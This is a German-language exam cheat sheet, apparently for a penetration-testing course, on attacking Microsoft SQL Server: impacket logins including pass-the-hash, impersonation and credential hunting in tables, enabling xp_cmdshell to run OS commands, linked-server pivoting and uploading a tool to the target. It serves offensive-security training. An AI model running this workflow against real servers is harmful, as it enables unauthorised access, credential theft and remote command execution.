# 🗄️ Microsoft SQL Server / T-SQL — 1433

> Prüfungsziel: anmelden, Datenbanken/Tabellen verstehen, Credentials finden und prüfen, ob der SQL-Account Betriebssystembefehle als SQL-Servicekonto ausführen darf.

## 1. Dienst prüfen

```bash
nmap -sCV -p1433 $RHOST -oN mssql.txt
```

Achte auf Version, Instanzname, Domain/Hostname und ob SQL- oder Windows-Authentifizierung verwendet wird.

---

## 2. Mit Impacket anmelden

```bash
# SQL-Login
impacket-mssqlclient '<USER>:<PASS>@<RHOST>' -port 1433

# Windows-/Domain-Login
impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>@<RHOST>' -windows-auth -port 1433

# Lokaler Windows-Account: Zielhostname als Domain verwenden
impacket-mssqlclient '<HOSTNAME>/<USER>:<PASS>@<RHOST>' -windows-auth -port 1433

# Pass-the-Hash mit lokalem NTLM-Hash, falls Windows-Auth und Account geeignet
impacket-mssqlclient '<DOMAIN>/<USER>@<RHOST>' -windows-auth -hashes :<NTLM> -port 1433

# Falls die Standarddatenbank Probleme macht
impacket-mssqlclient '<USER>:<PASS>@<RHOST>' -db master -port 1433
```

**Was anpassen?**

- Ohne `-windows-auth` nutzt du einen **SQL-Login** wie `sa`.
- Mit `-windows-auth` nutzt du Windows-/Domain-Credentials.
- `<DOMAIN>` ist die AD-Domain; bei lokalen Accounts meist `<HOSTNAME>` aus Nmap/SMB verwenden.
- Passwörter mit Sonderzeichen zusammen mit dem gesamten Login-String in einfache Anführungszeichen setzen.

Alternative mit FreeTDS (`sudo apt install freetds-bin`):

```bash
tsql -H $RHOST -p 1433 -U <USER> -P '<PASS>'
```

---

## 3. Impacket-Shell: zuerst `help`

```text
help
enum_db
enum_logins
enum_users
enum_owner
enum_impersonate
enum_links
```

Kurz erklärt:

- `enum_db` — Datenbanken auflisten.
- `enum_logins` — Server-Logins und Rollen anzeigen.
- `enum_users` — Benutzer in der aktuellen Datenbank anzeigen.
- `enum_owner` — Datenbankbesitzer prüfen; Besitzerrechte können wichtig sein.
- `enum_impersonate` — Accounts finden, die du mit `EXECUTE AS` annehmen darfst.
- `enum_links` — Linked Servers suchen; darüber kann ein weiterer SQL-Server erreichbar sein.

---

## 4. T-SQL: Orientierung und Tabellen lesen

```sql
SELECT @@VERSION;
SELECT SYSTEM_USER AS login_name, USER_NAME() AS database_user, DB_NAME() AS current_db;
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
SELECT name FROM sys.databases;
```

Datenbank auswählen und Struktur ansehen:

```sql
USE <DATENBANK>;
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_NAME = '<TABELLE>';
SELECT TOP 20 * FROM <SCHEMA>.<TABELLE>;
```

Typische Prüfungssuche:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_NAME LIKE '%user%'
   OR TABLE_NAME LIKE '%account%'
   OR TABLE_NAME LIKE '%login%'
   OR TABLE_NAME LIKE '%backup%';
```

**Was anpassen?**

- `<DATENBANK>` aus `enum_db`/`sys.databases` übernehmen.
- `<TABELLE>` und `<SCHEMA>` aus `INFORMATION_SCHEMA.TABLES` übernehmen; häufig ist das Schema `dbo`.
- Erst Spalten mit `INFORMATION_SCHEMA.COLUMNS` ansehen, danach gezielt `SELECT` ausführen.

---

## 5. Rechte und Impersonation prüfen

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

In `impacket-mssqlclient`:

```text
enum_impersonate
exec_as_login <LOGIN>
exec_as_user <DB_USER>
```

Danach erneut prüfen:

```sql
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
```

> Nur Accounts impersonieren, die `enum_impersonate` als erlaubt zeigt. Zum Zurückwechseln Session neu öffnen oder SQL-seitig `REVERT;` verwenden.

---

## 6. Betriebssystembefehle mit `xp_cmdshell`

Nur möglich, wenn dein SQL-Kontext ausreichende Rechte besitzt, typischerweise `sysadmin`:

```text
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell hostname
xp_cmdshell "dir C:\Users"
```

**Was passiert?** `xp_cmdshell` führt den Befehl als Windows-Konto des SQL-Server-Dienstes aus. Dieses Konto ist nicht automatisch Administrator, kann aber Dateien, Credentials oder die User-Flag lesen.

Direkt als T-SQL:

```sql
EXEC master..xp_cmdshell 'whoami';
```

Falls deaktiviert und du `sysadmin` bist:

```sql
EXEC master.dbo.sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC master.dbo.sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

> **Hinweis Prof:** Erst `whoami`, `hostname` und `dir C:\Users` testen. Nicht sofort einen großen Payload starten. Danach passende Windows-Payload bzw. einfachen PowerShell-/CMD-Befehl wählen.

---

## 7. Dateien, Linked Servers und Hilfsbefehle

```text
# Verzeichnisse auf dem SQL-Host auflisten
xp_dirtree C:\Users

# Linked Servers
enum_links
use_link <SERVER>
use_link ..

# Lokale Datei über Impacket hochladen, benötigt aktiviertes xp_cmdshell
upload ./tool.exe C:\Windows\Temp\tool.exe
```

Beachte: `! <CMD>` in `mssqlclient` führt einen Befehl **lokal auf Kali** aus, nicht auf dem Ziel. Für Zielbefehle `xp_cmdshell <CMD>` benutzen.

---

## Prüfungs-Mini-Flow

```text
1433 offen
→ SQL- oder Windows-Login testen
→ help / enum_db / enum_logins / enum_impersonate
→ Datenbank auswählen
→ Tabellen + Spalten auflisten
→ Credentials/Backups/Benutzerdaten suchen
→ IS_SRVROLEMEMBER('sysadmin') prüfen
→ bei ausreichenden Rechten xp_cmdshell whoami
→ User-Flag/weitere Hinweise/PrivEsc
```
